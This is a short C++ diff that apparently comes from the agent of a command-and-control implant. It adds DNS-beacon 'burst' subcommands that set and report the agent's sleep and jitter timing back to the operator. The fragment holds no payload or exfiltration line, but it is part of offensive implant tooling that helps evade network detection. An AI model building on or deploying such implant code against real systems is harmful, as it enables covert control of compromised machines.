@@ -615,6 +615,35 @@ void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(subcommand);
 		outPacker->Pack32(agent->config->working_time);
 	}
+#if defined(BEACON_DNS)
+	else if (subcommand == 5) { // burst set
+		ULONG burstEnabled = inPacker->Unpack32();
+		ULONG burstSleep   = inPacker->Unpack32();
+		ULONG burstJitter  = inPacker->Unpack32();
+		ULONG taskId       = inPacker->Unpack32();
+
+		agent->config->profile.burst_enabled = burstEnabled;
+		agent->config->profile.burst_sleep   = burstSleep;
+		agent->config->profile.burst_jitter  = burstJitter;
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->profile.burst_enabled);
+		outPacker->Pack32(agent->config->profile.burst_sleep);
+		outPacker->Pack32(agent->config->profile.burst_jitter);
+	}
+	else if (subcommand == 6) { // burst show
+		ULONG taskId = inPacker->Unpack32();
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->profile.burst_enabled);
+		outPacker->Pack32(agent->config->profile.burst_sleep);
+		outPacker->Pack32(agent->config->profile.burst_jitter);
+	}
+#endif
 }
 
 void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
